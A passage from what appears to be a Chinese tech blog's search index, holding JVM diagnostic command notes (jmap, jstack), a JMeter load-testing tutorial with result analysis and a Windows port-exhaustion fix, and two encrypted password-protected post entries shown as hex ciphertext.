-finalizerinfo pid 打印等待回收的对象信息 jmap -histo:live pid 打印堆的对象统计，包括对象数、内存大小等。特别注意，这个命令执行，JVM 会先触发一次 GC，然后再统计信息 jmap -clstats pid 打印 Java 类加载器的智能统计信息，对于每个类加载器而言，它的名称、活跃度、地址、父类加载器、加载的类的数量和大小都会被打印。此外，包含的字符串数量和大小也会被打印 -F 参数表示强制模式。如果指定的 pid 没有响应，请使用 jmap -dump 或 jmap -histo 选项。此模式下，不支持 live 子选项。使用示例：jmap -F -histo pid。 jstack 使用jstack 是 JDK 自带的线程堆栈分析工具，使用该命令可以查看或导出 Java 应用程序中的线程堆栈信息。 命令 说明 jstack pid 输出当前 JVM 进程的线程堆栈信息 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 软件测试"},{title:"JMeter 压测教程之一基础使用",url:"/posts/7e51ed02.html",text:'大纲 JMeter 压测教程之一基础使用 JMeter 压测教程之二 JVM 调优 前言 JMeter 官方网站 JMeter GitHub 仓库 性能指标 RT (Response Time)：用户从客户端发起一个请求开始，到客户端接收到从服务器端返回的响应结束，整个过程所耗费的时间。 HPS (Hits Per Second)：每秒点击的次数，单位是次 / 秒。 TPS (Transaction per Second)：系统每秒处理交易 (事务) 的笔数，单位是笔 / 秒。 QPS (Query per Second)：系统每秒处理查询的次数，单位是次 / 秒。 对于互联网业务，如果某些业务有且仅有一个请求连接，那么 TPS=QPS=HPS。一般情况下用 TPS 来衡量整个业务流程，用 QPS 来衡量接口查询次数，用 HPS 来表示对服务器的单击请求。 最大响应时间 (Max Response Time)：指用户发出请求或者指令到系统做出反应 (响应) 的最大时间。 最少响应时间 (Mininum Response Time)：指用户发出请求或者指令到系统做出反应 (响应) 的最少时间。 90% 响应时间 (90% Response Time)：指将所有用户的响应时间进行排序，第 90% 的响应时间。 无论 TPS、QPS、HPS，此指标是衡量系统处理能力非常重要的指标，越大越好，根据经验，一般情况下: 金融行业：1000TPS~50000TPS，不包括互联网化的活动 保险行业：100TPS~100000TPS，不包括互联网化的活动 制造行业：10TPS~5000TPS 互联网电子商务：10000TPS~1000000TPS 互联网中型网站：1000TPS~50000TPS 互联网小型网站：500TPS~10000TPS 从外部看，性能测试主要关注如下三个指标： 吞吐量：每秒钟系统能够处理的请求数、任务数。 响应时间：服务处理一个请求或一个任务的耗时。 错误率：一批请求中结果出错的请求所占比例。 JMeter 安装在 JMeter 官网 下载安装包，然后解压文件。进入解压后的 bin 目录，Windows 系统运行 jmeter.bat，而 Linux 系统运行 jmeter.sh 即可启动 JMeter。 提示 本文使用的 JMeter 版本是 5.5 JMeter 3.2 以上版本需要安装 JDK 1.8 以上版本才能使用。 JMeter 默认支持国际化，因此可以很方便地支持中文显示，切换语言的步骤如下： JMeter 压测案例添加线程组选中 测试计划 并右击，在弹出的菜单中选择 添加 -&gt; 线程 (用户) -&gt; 线程组 线程组参数详解: 线程数：虚拟用户数。一个虚拟用户占用一个进程或线程，在这里设置多少个虚拟用户，也就表示设置多少个线程。 Ramp-Up 时间 (秒)：准备时长，即设置的线程数需要在多长时间内全部启动完成。如果线程数为 10， 准备时长为 2， 那么需要 2 秒钟启动 10 个线程，也就是每秒启动 5 个线程。 循环次数：每个线程发送请求的次数。如果线程数为 10，循环次数为 100，那么每个线程发送 100 次请求，即总请求数为 10*100=1000。如果勾选了 永远 选项，那么所有线程会一直发送请求，直到选择停止运行脚本为止。 延迟创建线程直到需要：直到需要时延迟线程的创建。 持续时间 (秒)：测试持续时间，会覆盖结束时间。 启动延迟 (秒)：测试延迟启动时间，会覆盖启动时间。 启动时间：测试启动时间，启动延迟会覆盖它。当启动时间已过，手动只需测试时当前时间也会覆盖它。 结束时间：测试结束时间，持续时间会覆盖它。 添加 HTTP 请求选中已创建的线程组并右击，在弹出的菜单中选择 添加 -&gt; 取样器 -&gt; HTTP 请求 添加监听器选中已创建的线程组并右击，在弹出的菜单中选择 添加 -&gt; 监听器 -&gt; 汇总报告 、聚合报告 启动压测脚本GUI 启动压测特别注意 JMeter 官方要求在一般情况下，要使用命令行启动压测，而不是使用 GUI 的方式。 命令行启动压测保存压测脚本将所有操作保存为压测脚本，文件的后缀是 jmx。 命令行执行压测进入 JMeter 的 bin 目录，执行压测脚本。 1jmeter -n -t /tmp/jmeter/product-up.jmx -l /tmp/jmeter/result.jtl 参数 说明 -n 命令行模式 -t JMX 脚本的路径 -l JTL 结果文件的存放路径 分析命令行压测结果使用命令行执行压测后，输出的日志信息如下： 12345678910Creating summariser &lt;summary&gt;Created the tree successfully using product-up.jmxStarting standalone test @ 2023 Jan 10 13:38:23 CST (1673329103194)Waiting for possible Shutdown/StopTestNow/HeapDump/ThreadDump message on port 4445Warning: Nashorn engine is planned to be removed from a future JDK releasesummary + 16585 in 00:00:06 = 2582.9/s Avg: 70 Min: 7 Max: 314 Err: 0 (0.00%) Active: 200 Started: 200 Finished: 0summary + 3415 in 00:00:01 = 3162.0/s Avg: 53 Min: 4 Max: 99 Err: 0 (0.00%) Active: 0 Started: 200 Finished: 200summary = 20000 in 00:00:08 = 2666.0/s Avg: 67 Min: 4 Max: 314 Err: 0 (0.00%)Tidying up ... @ 2023 Jan 10 13:38:31 CST (1673329111081)... end of run +：表示过去 30 秒的执行情况 =：表示脚本从开始到现在的运行情况 在 JMeter 的 /bin/jmeter.properties 配置文件中，可以修改 summariser.interval 参数来指定控制台取样的时间间隔，默认值是 30 JMeter 查看压测结果在 JMeter 的界面内打开压测脚本（后缀是 jmx 的文件），找到希望查看的监听器（例如 聚合报告、汇总报告），然后点击 浏览 按钮，选中上面生成 JTL 文件后，即可查看对应的压测结果。 命令行生成 HTML 压测报表JMeter 支持根据 JTL 结果文件生成 HTML 压测报表，具体的使用步骤如下： 进入 JMeter 的 bin 目录，修改 reportgenerator.properties 配置文件，将 jmeter.reportgenerator.overall_granularity 的参数值更改为 1000（设置报表中数据展示间隔 1 秒，默认值为 60 秒） 创建一个存放数据报表的文件夹 (例如 report) 执行下述命令，根据 JTL 结果文件生成 HTML 报表 1jmeter -g /tmp/jmeter/result.jtl -o /tmp/jmeter/report 参数 说明 -g 指定 JTL 文件的路径 -o 指定 HTML 报表生成到哪个文件夹下 浏览器打开生成的 index.html 文件，就可以很直观地查看压测结果 压测结果分析 若有错误率则需同开发人员确认，确定是否允许错误的发生或者错误率允许在多大的范围内。 若吞吐量 (每秒请求的数) 大于并发数，则可以慢慢的往上面增加并发数；若在压测的机器性能很好的情况下，出现吞吐量小于并发数，说明并发数不能再增加了，可以慢慢的往下减，找到最佳的并发数。 压测结束，登陆相应的 Linux/Windows 服务器查看 CPU 与内存占用等性能指标，然后进行数据分析。 最大的 TPS：不断的增加并发数，加到 TPS 达到一定值开始出现下降，那么那个值就是最大的 TPS。 最大的并发数：最大的并发数和最大的 TPS 是不同的，一般不断增加并发数，达到一个值后，服务器出现请求超时，则可认为该值为最大的并发数。 压测过程出现性能瓶颈，若在压力机的任务管理器查看到 CPU、网络和内存占用都正常，即均未达到 90% 以上，则可以说明 Linux/Windows 服务器有问题，而压力机没有问题。 提示 影响性能的考虑点包括：数据库、应用程序、中间件 (Tomcat、Nginx)、网络和操作系统等方面，优先考虑运行的应用程序属于 CPU 密集型还是 IO 密集型。 常见错误解决错误一错误信息 1JMeter Address Already in use 错误分析 这是 Windows 系统本身提供的端口访问机制导致的。Windows 提供给 TCP/IP 连接的端口为 1024 ~ 5000，并且要每隔四分钟来循环回收它们，因此就导致在短时间内跑大量的请求时将端口占满了。 解决方法 在 CMD 窗口中，使用 regedit 命令打开注册表编辑器 在 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters 下 右击 Parameters，添加一个新的 DWORD，名字为 MaxUserPort，然后双击 MaxUserPort，输入数值数据为 65534，基数选择十进制 右击 Parameters，添加一个新的 DWORD，名字为 TCPTimedWaitDelay，然后双击 TCPTimedWaitDelay，输入数值数据为 30，基数选择十进制 退出注册表编辑器，重启 Wnidows 操作系统，让新增的配置内容生效 若是分布式执行压测的话，控制机器和负载机器都需要这样操作 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 软件测试"},{title:"近期开发计划",url:"/posts/29d74d90.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b33fc39e79fb8f4428211a3627c1ec7a0cbbf24dada87cb794a94c4848262ef48357c8d73a5bf83d40948261328d66e0bff17ffd38d41bcd0d1fc683fc31dd3c80e71868c7bf52ab01e12be51f74475299f4ac9540a69a67d78f5e7c10d4c0b764a171047a5eaf857aa307673cc4c870e17499b5c62dccb724834333eb82019590ad2374fbd15ce6c9c7b5d1dba92e43554f32d1c73942822adecdef87379cbac9e9349bd85119796d6a5c6631f5e516f0478907db61af4f983aa6ad2b5393cf975687eb140a1e9fbb2292575ea2aedd7553199ac383d191771bd23715e460a04bf468193f6e2071f64e22ed4c65c2ac7d8b8639d9771ee6e2498836a50c2cdcc137a9101754df3b9d9b71ae22b063068988f7b452b687a3ca86f1225e78aea53ae9375d1ba81ed8c51c939b3dde59d3e8aefca60992d4c3b0403027a8d42fcf983c2a28e783d128345be7644aa8d307e910d3243bbf5eb15536f73a261eb53d9b3988aa2d107e8ce57128cbeeab9f603f34ed98a0344711549d8dfc12ee7e4f523e9331bbd2fe1b96e28595c8c35d3b74eb5331a584aed77b4b8622ce0ca8e753d4c2d9d40bb9076f416ac8be5ad0ea4bbb96f2b0c1d2c9ef3143b19fc88812c9316f4597ec62754e1b6fd143b53b4cbf558cd97bb31a8f925575f66b654e4db89cb123818c22728218ac94a8cc6f144f065109b3e161cbae085fd1245f06c3dace220f1f3364404d30c648555164a3d17b9350c87a3e729c43d71ee930713b97180e6cedd8f66bce07cc0e987ca5d654765b60c4cdeec99766445f4a461a33c8cc2abfa6141ae8efae11cc60ca3456b9b5b1a3ef333dabce99ddacf93d73ff4c34932fd6743bd9acee3d86ee76b70100a38d0f851ca78d471659f712678ae4f5ce4e8ef293270d7f3ba385e80fa4f7446587036faa9a3e770beecc11cb89010ab32cad945c01b9c0f492e041409e3242358a28f2a37a2d47f8df072492b6b828ac8a6641e55e6e8a8dbaedbc46a4ee47c5820fd421692e82e071a3d818a11b7567cf6ec8f2aeeae664293f010946d8f7779519d9f256f0bbf03b06c7a26a656a8fa6ea8909fbe1667551b407493ab36fd558546aaa0cbf8ecc693595e5937e17374be0e91d457b8dacf8a8220f87378a1c40183c6be19cc6cf7a4af755e2bf9bebfc9c9dfc115691062decdc85144e69fbc958454f0fd17e180d11929875a331078d20a34c7e10cc2b82b59f4542b864772dbe7c41b6a1fc5ddd5bfdc8b384db2bc66388f6bc1b1864fdb45bc982d93c145584870ccd57a03857df6b939c2471515fa40193b30ce65c9c8cc9837b364abc4994be29e95e548bb8142bb65b4f97ca71b41b5cf01579c8ca8ba59093d054b6f8b319ea4d7d043b5875bbb33df394863ad5222ceee5dbb0f78219096668af908d185460b46613f3ac2730a5fbe350d3fe6c3f268277e40f95f32c6f2d5b46024580e16f734e83fbc5ce911105d0ade5acacbc166d876a55224822e60af914c8e51f23deaa29a967745fe1191dc3ca83858bdfec6fe673bcb52b7226e91bfc571868a777bfd15ad310091e6be97a73019db54d5c55b5957ab2861ef0ccbc622c82362592a7c22e4afd3877eda3f0cba2fc6530f786d8f2000765b498f71880559c01abcf78ea3e3f6bbcf1234a3622ebf57ba49c3804e192e86faa080ddd2ef5a089352b80faa4ac803db66312b083acb8960eec86ab298fb4c3a7c4d668193124401f6c627a3448579fbe11d0370147988f37e4f5f8be855b6cc424f32ebe9b24bf4902e21aba3b406d84d88baf7c6044d99cfdd5b8b6a0bde43ae5213648a5c0e2b87aa4e1f3b875af58e99883a017a13c5a1cb2c111ed166188b5890e0321016791328679f845f4b5ef55ff591102cc4e759f1b495cf946bb62fbd6523395c1f5297ae674140df5237f0320e05ed51d491ab7420ee9850766886b66b1b2bb752ff3e390cb5bacb8e58382d07cd93badcfb079360d6ffe0e76983a1e89770fcbaa5d0b547a9fd0055dff387344e5cfd0eebfa328ebfb9f4e15ecbfe65a707c4857c750c2094e7282ed0a706b7c7c38efaa978cd61b1b52dc0146d1449b63411caf8691230385e497f295d184a762a787a942d7cc7bbef527d5c3d1d8a0a072d74167f79ee9dd31bccd7d8949305759df0a2ca789529ecfd4d7fdf8fdbdf3d256f66d77b2c825465e51ffb190722187e027bdb345eda0b348348656d50f8b94afdab25fbcde37e776d8fdc7ab0ccebb3228fa1d8e78c9abe543278208ef1693315819ddbe8c32ee6d2116c4e67a71c5ffe828a6b35556d71630bc0128ce5cce5933f8315b002cab23086b33567b937bd2196bede8aecd38109e7d52bc94588f5494bd0c619ea614d8dd17666e8089a9fbf50ac3245e936bd027cdab07bc83a1ae99218e7a1966e684344e3b94273aaf1819704a69e881e7d80d75653db0d61f8076f81c0c82ca81e2065946c2e6b3a95a174c3209fb9bb72acee754aa3a4e47f72cb4680a6b1f54ac8fda1c7cda5cde7ea31174c159c52aed001a4af518080226292ea2bdba554b99785aadc508332f193158d68792d55f27f0926257c4092b698386fc7d12ebc69f488911b1990ff72bdd1682cf7c2504148ea6e2a652729550ab27aed54c55f7b3f90f0a7c10dce2fdf02d4b45220906f875f713256e3de175feff7f8c3245baf8ce50152fdb2150153ce484e747eb8cd58b95a4a10bcfb965dd1cefdab5cdf293d1805d747fea3e94628e605683317b38e87e50c110a4f537c0afaba522008545995ee8af187467b5c8fcd503d9670064ad6072cee5fed1511919f0222528cd61f3176058d4a7741267cfec3a4209dbd236ad093b53100b5c986fbe2290c6bd68d5365aa5a2f4f0618ca86bd9ab762c612e52186269913d3a2a2f34cff4f5c6094840a6c1860b904d6c090dd4934c3dd32fa456453da120a5c78b428ddb9e94577200a38d283ccd1175f74ed4a241857cf08ea3469f651abc889a590f61af14321e792ec4bfd2a879ab7beff1b81339f2ebc8cdc873817ac561ca77e3e3c16cf401ebcd8a9233ae15f744b45aecf4a5915c80b0a00446225099e52eb520b227bf800b6664923ced1443e96037fe05a748c11803d5fe8a95eea9f2493d73c92d8e76af3e6ebb9af53c5bc87d8f851c14886bca7754ff28c4a47921681677fab7352f6901cb97732b702e7b192ffb44b81c6667dd77b8641c84a9b97a05772713e436209e79fd4215dd5601771557418c05c6fedae2a456c09d1d3be1894e59b7e31302a06367a31e1023d9ef1697e2d5ae09a46a69908ebc4845a9ccc8fadc574ad37d601895f9086f96bf78b7515c69729621196c1f5999a100a1f99593a0e831d7853c3cd6efe1269db293bc0a9bff6792613934fd654b6fb0a0fd47bb6b89d5c6ae9c764848ab650a38abd265cb3718f2021196a9b5bbc6c30febc103b536bf0a62ae4be38cb17f0a4f5547ff3b72dc87e6e510ee72f429eb532d200fb96b67048865cf258742cc28112aedb4b7d06ab74ca6ea9d19cc1ca1baed5f8c3de81ffdd72694b2c704546d76dc9524bee43626ca78ebe124bed475a239d90f354d06a55e5fed610912972a8eb60211c9405c00bca87c5722aad198ffd05ddffec4a2f5e8699c32e0c7533afc73f6955b7fa320cd0c16c4b12e9c4534b9589dc37d5e6dd2b81dcbcf2d9e0bb6737da79b28b04c640bc34fc941c889023b1fd052437e14f2d4b324983e4f72603226c5e9481f43d3499e2907e082ee8b52b19f676cf3e48e122e28a656f16e397bdc33f3a568039b5b6123518e0488eed1e54abc2c79311c26b21f420f12987903413b379761b542a5a460b5ea589c6bf66753f32efcb333b44275a412d773c54f8f9c1319a54384251883366dc59210a3001c2d9415ae34af30dc8eb7ce0b32dddd7f2530d4f5ce55c64c206a6afcd6ef0969310110774420eb15d9272fbca9e7f0ade7bace03ea9446ead220759e575edfd9bb9fec67a6eef05bb78c6430384a525d39404033c84565b32f0b6522d3fd26cc0bee448be7fc3a02f9479ae1cbf28fd2f3e10580145d549971e61b7dd6dcc915da5e2d9ae6142530bb4bccf0458cc10488d3cc534c7f6cde05e1d5ed92bd68a62fbbe81612a3f162ae6a546838e9cd1fae00e60900589e21c35538825f0ccc18ecde01af6109035af2182704e6ffcd167488732152981069f224e5290fb78cddd271834174dcf5227bc71779ad22a445f0f5ef98e924976f0f77e6febed8d126a87a3520373d366bf2d8e719aeddfa3717d251c984f144efd27d6d8e77d9f059c0ee5278de4a733ad12ebb170ffbac7b33f1774d19f358ecc00e8a91e018b1e68b30c7bfa8e0eab4a70c5846085f3ea1bf23f1eeea0df8d5b7eab929fa7a321ea3e9d26757b83610473162a2b8d4fdab5a091243bfa9b876cb87a52d42fabdec2a5523d13470716d33c068c3abc1ba377084882558848fa3ea1ee94b19b004545a2a0987eba3f974cc46d356db9620d07e0a2e37b3c1b74ec878bede69ee83a050aa70fce7a57530accd63818eb29e965e15fe490e1210316fe3b5dd377bc2dcafd8035b076010db9a346800722af4ef7e456c53fac337f7ffda8e36d42e6d901a278685b03baf15688daf7a85c21cd4b7576fde1ff0fb759f34dbcfac95635327c9e0088799fe7585eb73b3153836ab57851f3eca8526efc39a1899f5f1ac2232a9b59948410f7407acc43819b4816c0f632e676a82a4d93aa45de55022d603d7ccf4825ae595fa92919347a6e8420ed80fb40b701533aaba2955785a0f53c6ad8500312f87f59379858c16bebf4529ce35a725663e00b73fe1c7492db335d42272d8e46abbfad17598ceb29c11e2043702338b841ca3ac74392c83c30305e933cf63384845976be03d8cd65cf4f2a2cec5218f66c3ee727ec73239226565223e4bb42e951f7a98d3de6f9e3c910d3352d4e06403205f4aa5ef341d497011391ec8465ed7a81a685f5dc0adc535066974f353d80f722ecd7fe94da8c35d7b16b5b25b8c742bd3daf4483bb443903910300eb01cff4820fa09234d2c7653cba0cb5d7ab0c8f7e3609f1c7b8ac807b6f7e4576f41b76eeb3f7e91a7dd47bc42aab0d5f3a41c64ab3f7d1f2b025d9c882dd73351e801eded6bcb41dab5f45b2d3684bdf82420d951364255a73a05edbc62c258ea5cb399b9466904c3bde704973bd49184dab126bce339d1a6015250d648823b6f47835c50220ad9340c68822a902a77f083eaa2316ada9ec8301e848dfc512ca7cd2554056b0e524ede700621cc9cded23f76ef36976240a4c85cf11d1fcbe09cc7ec060adef8d71515954e52f5e296a6c1489dab0c77d552403ccb63fd9b6eb1eee0b5dda4492e7c0422328850f2d556701bfd730607624ed25a0a4de6c85dabb570af1fe567d961ad3fe5e72a6a80cc1b3f26f9a8dee70a7bca95533688c3f9ec8bf85c71a7221ffda1e327a1ff82d5a976424c52930ddd3f2feb675d36995307b24497e99d118adff8d12878a1f10e88b54614638e488441fad367b5b6cb5f8314bf03fead9f9a6b35efade372b334b66cbb5a4b9a95dbec93fc3274a3edbc25896ce17d3ba78ae4aa2eb21ed77e157dc286fdd608c8904b3c3c1aaf4e83db48a04a14d38bea02598c362a3799547de101eebede461fc0a5d8b445ed40542011a1e1397c0ce20a37197946ee1762acc792fff21d991f7d7ead27173601111af665638239583001fe51417ef4ec1b3e4531979ba570ba1b2b2cf54fd19038218210d18247a3219dd420b8cbf76299e0b23d1b8ab12123f7a9e916eae37133df179e975295f803d3180372d1524765e49b3e81db36f502c39799ba77f80d1aea675fdf4877d32b295cc57840a293084104fa0e6ad011c4dacce889757039201cb039659db2b52c95be5991235bcef262c109e9b85cf0a2af65c39bd9043991e7d6516e78111026cc8805b76447369e7add3c0d382ba463a5c1ce85c3d35b3e0b93efe994bde8164da8f987cfb71bc04e422440ebb581395ca609dd97865e2cf3b9b68b2a1437f21ded1062a6c787c7c46503cc3cb095c6d40fd02fad0aa17008ebd57f7af743f108bd080745f5eaeefd0bb66210569eef337119fc322cb63acb9fad8f85c1787d62414abeedd684d59ae566233796cf2508f43f1fb78b1ed9fcb536ef159796137bfca4989d7f06b5bc14b77111bff3d6114b92a07ef365bd607f57e6d727daca795e0f7c36ddd3cd8627ff5ee858419f2d60411d31ef08e3ca90bda3de59bce05f127093368d03f4c8ba299284d86b8c443a009a8638beddd0a546c349b1d46eb1aa8725ecdf1cd457b44e3beb51ad31ff5994c358090002142b2eb3e1196d2dab96e21896626a972d0bae4b25714ee4320f09c9304bcc12b4a919ff21a473838d5e242d708b1ddf2ff9790e64b4644e77e6c6e4b3a5eea2d18f512dacb49a70f2ff5a7ef06122a95e0597f4630749825f076f2e5e9ab2e0a8c7a3cdd4b6ffe1bdffc6791a81ac1d94a1510f3dfe85442b3b6953d61d512acc70c4fa7e298c67b3cff901ae4abffe4abd372611ce1d86e3c85188a49caa63923cf02610cf6684fcc06d563d499bbaf7e984646963b0d681126c20e7fb05e6701748043299bdea6233fbb498ec5ceddf3e45846e4b89e34907285e5a4a81e6676e246c8032e025f7d5689889a98bb68e0c231e01b66fb8fede3da4f1f6b8e86fc149537432f79b65382df0b61fb8c7112f30fd79530b19facf3a5b224d872e58e068c5d5f902f00811c9fa4891dce80b67aa8c65dfa31b0db57f69443c95bfa9012785371b2edd4b0ffddf24cb4bd55dbd649d5e37d33657085d44513b19160d170e32ed2d90fbb00699b30c613796b6053835f3d7a95822258f185f29689ab096db11c32df4337f246f2b2b05338a11949e6048c2cd427d4d1ada0522914e29dfbb5b8c76874c12ce67860b6e650ac5da8b037140e4d24bfbc7ab82f0393e7a73361995b3ca705ef8538f56ab97d23d147399648a63eeb55e631ffe74c9f725e93d2ab1b301838d9e507bd3f31aa312bab2a759bbbe7070aeb16b88c7a82a4fe7b8151b452489049cb3d433efd39bf1e94bc5656209ce93780cd93b4bffa055fb3a65157dd46b62504466599138725f5691536d300cb89677914a7eb2f92e47883c296fa5a6bf384630655f5f811ad312f59a919fa4a17f3ac1f9769b153e4f416b0cd7a6aa153327ace1cdc69cf60f97817138a1b113290ee9b5ff005a6f7402fd635f8031a7f64ed8d2f82d9314f263aa790cda70b0d2d4c91dcac4f668fd6f55d0a0e48 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"近期学习计划",url:"/posts/860c6c02.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b51e73c35435eed90a9068092b489c658b028b33e5f1ab05d76df0373120c8983d98e4470f24650b2b21743d5f7cf39432d8b4d8045c4fbf88c8d8c159efa793fbec55d9e9eabf0365d47a5212e1f3e36462f38bda587cfecb0dd3d662f93873bb67804978c871968443060e32f8fa05e310fe6fd6b66c545adad8bcd9970ed074dc2ed1df02b70c21593cdd3a7a0be8bfbdfe746e958fd052b06048eebb7b8190cdad8d3cad2e55034c595374ffcc92f46c01449395f46b5e7885bff538e593635d4748aa16fe58d2b0c25693bbe3e6972ab55df1737f89c5b8df9921abdefea1a62517a98350f1f4d235aa5f0882ce35e47db139c79fd8214256fbc410ee7a6f6da0006c3539e52638536a86074c3a206d5a1ba09c4a03be3dfe1ed533153cd3cd001e7aee2ff97d2d8a2129b69b7edd4fdd00e5fe0605caeb783c1ef07c745bd11a7978ac3460bfae9028ab56a51a80b3f59f7d56638424e253e7395d67cb4fd67f9e756e392227c85ea1374274494d9607f50f8b6743f513e77ecd3dc6750e1db745af8c5dc680bbc106b254d42a5fab80a749018f5f0ab4cc309585219bda0a5c8ac415332cd14bb5d1d9ecbdedb62ecfb8bbbe02ef2b7cead3a4a9a3ce42828420f6fe21a57975a7eca18eec5152b667d54e234e3ae2c39887189850240d4ad5fc8fe0da5cc336bba6bb8bfffe6fb0a40207a62795985a6d8dc26322d49174fc99fb73cbb1ae48718decd923505f4e82eca8ec4432f1cd1118a4fa987958afbb483df1d279a4989f4c6720450ac1333c193423104506a512241559dfdc2353df54682fffa2eb56150db00b1a9bce92bfb581927a00e147e6ea8191d1b09a1f21d0cecf19a29139328b956b5b58bf39117b8e66c8f9ad790bae5a1df135f2695b4a474010ae358192a33f7d43784cc776e83216da0c33c8a2384314c03ac12b373d19c23388d0fc8ef069533abaa8156bb73b6a049256e435c0f1ab5c678fbc370e12cfe521078d5a31227e6c33cc7845c67e07f6e98dfd18a6d040b79679c5be43ef171ca7358b067bbd3c50199c170bb07010e6b13907887e0b6820de72674b7f64a7507ef7443e7eb2546c0b32007ac81e8c9c31bc5c3080192ce3f2220993978038236e7c7d6487e8aa604bcf2ac84d5660578f4f0c9b1f063bdfa2347f8d770f7d2d4a96caedf83cc57644d6606656cf23cd3a19d8f3cce0b1f4262fe3b3826b39f38587b524792eab6fa099b27696a9fecb32758d5e3608c99dbc065fc1cec744c649308148aa9d8a908c4aac8dbce18a0eae828db45f5931f5c543c8b6b17b68517a8c59e4a51f45b130d35457903df84244a75dd81f440395ac7931ed029eb133cc1fe31ec5764ae036ca9230a9730766e39591ed4a641768f31b2eb894a83b3542908c7f7cbf2972494ade50b1c78f23a8a9651ead521f512bc010d88243cfad352a910dc285ee121a0ec93d67ab670f732c5b0cc5be038f0c333eb5cc74ec7e2d9b13ddb0f92c3ea1ebbde85fe0bb89b2abcf1fbd9e227eff47db03a9789acd8c2131f98eb1bcbba4c7e15cfb16eef36d71c76e0990822ed275b9354ae4527c49b3cd1c80c86827cbfbf550f933be6717ab01e7fa4364e7fd76c1f34a25b637e334be68bc29f8126cc9ee418d056bc7c9dfc453fbd194f6fd50685147dfff88acd6cbc6fbbca5f51590097c0c657b57bd1b1eeb548b720dc308bfc7f0277ef2d9bc59484174095782e84d285d87d317d82e3bc360c42611df276707d84a6fc7162f6d9a520731683672a97803e3a9aac9dee50de1be17d23b3f0de6de214ad66a20fec8e4345831b531b4ccde2b31ef04f0d2d0bedd9e6d662d315222729d348eb483017d20194413561e92c98c2a3133c965a6f598a7a4348ada4b1dce3858c04a8125b2786407e9bc0d652cceac5d0ac972e57f88d5181631c94519552aeb40e658126ef31ed80e1e6e8ee8359f496c806ddd4b4dadccf77bbf5586cd861d3cf1fcc9e976a65dcc8fdc3dcfa20c659154dcc6f395f8f9b4c4e783ba76a2f4e70775e6a1367ddf3ba53c8ab5232705482a0039cd57343db023ffe52fd1b0e31bf5b625969a854142e8bc31267538c3573f5963729726b3bc1aba55a7b31ee64cb5f7263628fdc93840d87f703e417c329c4db850833edf3739883a829e0dee10bbe7ad33952ccca0165f15805f9968d759776c86a2f4c0d4f3a62dd81ece5857fa27c2c6068815fe93c9336ef25b74ba77d573fcdc32638d56691aab2c168022fb43911f8db232b73342e42febe33a270b0a77d1cf62134676152d2c41a54fec346877d07da635553ce4f379c661e567f12e6da163e606a5ce18bdbf46f573204479735a7fab4819d5d36795db00d00a4f88f48e6d70833905f9517f03f33505ddb53cd36bb4cfb204926dfbcb50df4016991b2859d33094bab48b45605e6515964b2b5c320fb88dc3989453487b62307023b5f5fb755b240a833f4251d4ee0eaf477f4774a15e19b26fb1ea34e41205c99faacc325b4e98c0d0e977923a2ba412b02c9631b22e3dedd1bfc64786ac84285437e895647b01a1b9783244fb581ed9e813aaeb72a7d0e84ddda6ebe77666879e0c6556881dcb58d789916bd56bd2492fd11aa2c5de64a0940c8d7415ecd8383aa8288958ac144a74332aac6a3606fad11a30fcbf236593f1dea4af6771e87d61ff18bcf1fba77922baee7344358461e5ebc3ffbfbc3b536e13a4cb8cd450f07bf37192ddd516aa0a0c0a01e470c8264dc8663b4711b1212d6c41040352e3673293ca2cc02a34b442e3aad05639e4aed7772d5c6b9f8c56285b6f04d0290c52af68f212900f69053167ee8e3f9a4cf2a1641f575ac693a0cd9778f95cffc80fed2d81ec6724c8f925eab758a0748f10b5782f874d837ee917289afa4073249de1b96714df876455d9c4e95e96b90b8fc873aaf8df1d46912324153bb387eeb6e305b3852b4e233c3b3d1bf9f033005012b7b62873e8cbbded254a1fd8d33ec94d3c6377c84ace2da2852c6e0eda1e279567a5c517a845e0354bd2a0b6c2934a0c786daeca9aae62fc2f1d8d76fc19ee519ef4ca65dfa1699ec9019fed5588f4f9c9f8f3a130ef695954672ac2d63873cb63461f41f838b03daaa53535913343e902c3d9aa7b99351cc3ceb7bfd062ce73aaca58da50a8c7ec088faa60e631b6dd5db4d896f9a98ac52239b3d9d8bc63c3c46a08bc4ac952940b2181a41aa5ff6a90ed0f4d45b79b819c966f0fc59453d5ef22bc13381ff5f6e707c528deb46bae42233a1d80d43b3108f032524e7d2b272c286549f3d4870c13e294a93b8738ff6390e370d1cd4dd38b2a93d6a11f439930dba48816d1f66ec3a118395ef43c95c2e73ff019c62bbbf0e3439f6cc14261c727f7251efd030701f649379a0656d6a4f4ca28229d66aab81af6a1989607d97def04aadd419298017fa2ab2844fd7d872912befbac2067e884ae2b30f3640fe0fa4b1f246f1dc0e9766a3563aa3f6bf96ebdfb2d41d946606dc1de461f3bc3fb54403a019bc5390034c3a34ef5804904b89e3d